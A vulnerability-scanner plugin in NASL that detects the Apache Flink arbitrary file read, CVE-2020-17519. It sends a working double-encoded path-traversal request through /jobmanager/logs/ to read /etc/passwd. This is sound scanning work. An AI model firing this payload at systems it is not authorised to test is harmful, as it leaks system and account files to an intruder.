include("compat.inc");


if (description)
{
  script_id(51799300);
  script_version("1.3");
  script_cve_id("CVE-2020-17519");
  script_name(english:"Apache Flink any file read");
  script_summary(english:"Apache Flink any file read");
  script_set_attribute(attribute:"description", value:"Apache Flink any file read.");
  script_set_attribute(attribute:"solution", value:"Apache Flink any file read");
  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"risk_factor", value:"High");
  script_set_attribute(attribute:"in_the_news", value:"true");
  script_end_attributes();
  script_family(english:"Web Servers");
  script_dependencies("find_service.nasl", "http_version.nasl");
  script_category(ACT_ATTACK);
  script_copyright(english:"This script is Copyright (C) WebRAY, Inc.");
  script_require_ports("Services/www");
}



include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("openvas-https2.inc");

ports = get_kb_list("Services/www");
foreach port (ports){
	soc = open_sock_tcp(port);
	if (!soc)
	{
	  audit(AUDIT_SOCK_FAIL, port, appname);
	}
	if (get_kb_list("SSL/Transport/"+port)){
		res = http_get(item:"/", port:port);
		ssl_res = https_req_get(request:res, port:port);
		if("Apache Flink" >< ssl_res){
			req = http_get(item:"/jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd", port:port);
			ssl_reqs = https_req_get(request:req, port:port);
			if("/sbin/nologin" >< ssl_reqs && "root:x:0:0:root" >< ssl_reqs && "HTTP/1.1 200 OK" >< ssl_reqs){
				security_hole(port:port, data:ssl_reqs);
			}	
		}
	}else{
		res = http_send_recv3(method: "GET", port: port, item: "/", add_headers: make_array("Content-Type","application/x-www-form-urlencoded"));
		if("200" >< res[0] && "Apache Flink" >< res[2]){
			req = http_send_recv3(method: "GET", data:data, port: port, item: "/jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd", add_headers: make_array("Accept-Encoding", "gzip, deflate","Content-Type","application/x-www-form-urlencoded"));
			if("200" >< req[0] && "/sbin/nologin" >< req[2] && "root:x:0:0:root" >< req[2]){
				security_hole(port:port, data:req[2]);
			}
		}
	}
close(soc);
}
